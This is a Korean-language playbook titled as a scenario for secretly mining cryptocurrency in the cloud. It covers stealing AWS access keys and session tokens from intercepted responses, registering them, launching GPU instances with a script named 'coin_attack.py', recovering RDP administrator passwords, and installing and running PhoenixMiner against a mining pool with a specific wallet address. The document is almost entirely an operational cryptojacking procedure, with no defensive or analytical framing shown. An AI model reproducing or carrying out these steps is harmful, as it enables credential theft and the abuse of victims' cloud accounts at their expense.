<클라우드 몰래 코인채굴 시나리오>

1. access key / secret key / token 값 탈취
-> 이미 url 가로채고, response base64 디코딩


2.  aws configure 
  :  자격증명 등록(access key ,secret key)


2.5 키페어 생성
  : aws ec2 create-key-pair --key-name adminKey --query 'KeyMaterial' --output text >  adminKey.pem

3. aws configure set aws_session_token
  : 토큰 등록


(3.5.  resource 증가 요청 - gpu 활용하는 인스턴스 타입사용을 위해
      "requestUP.py"   -> 4번과정에서 리소스 제한이 떴을때만 요청해도 됨)
  -> 삭제. aws premium 기능이여서 사용불가, 기존에 리소스 제한이 없던것으로 가정.


4.  boto3 sdk 활용 "coin_attack.py" 리소스 생성 (및 공격 시작)
  
 
4.5 rdp 접속을 위한 ip주소, 비밀번호 확인
  (1) aws ec2 describe-instances --instance-ids<여기에 인스턴스 id 입력> --query 'Reservations[*].Instances[*].PublicIpAddress' --output text
  -> rdp pubic 주소 획득
  (2) Administrator 비밀번호 확인 -> key 파일 가지고 복호화
      * 먼저 openssl 설치 필요
      * adminKey.pem 파일 utf-8 인코딩으로 변경
      * aws ec2 get-password-data --instance-id <인스턴스 id 입력> -> 암호화된 pw 획득
      * 인스턴스id/암호화된 pw 넣고 decrypt-password.ps1 스크립트 수행
      

5. rdp 접속하여 동작 상태 확인
  (1) driver 설치(설치하면 cuda, opencl 설치됨)
https://www.nvidia.com/Download/index.aspx?lang=kr / 
https://www.nvidia.co.kr/download/driverResults.aspx/229741/kr -> t4 드라이버 다운로드 주소
https://kr.download.nvidia.com/tesla/552.74/552.74-data-center-tesla-desktop-win10-win11-64bit-dch-international.exe - !!바로 설치됨
  (2) 7zip 설치
https://www.7-zip.org/a/7z2407-x64.exe - !!바로설치됨
  (3) phoenixMiner 최선버전 설치 및 압축 해제
https://cutt.ly/eGJpAMA - !!바로설치됨
   start.bat - <mineable 사이트에서 구문 확인/ 이더리움 wallet 주소 확인 및 입력>
  (4) start.bat script 실행
    : PhoenixMiner.exe -pool etchash.unmineable.com:3333 -wal ETH:0x93E2C4A13B22633861301322B5A04E1d82f55687.minerGeun1#cpgu-t9qu -pass x -coin etc -gt 90 -clKernel 3 -nvKernel 3 -mt 4

  (5) 실시간으로 코인 값 확인
   : https://unmineable.com/address/0x93E2C4A13B22633861301322B5A04E1d82f55687?coin=ETH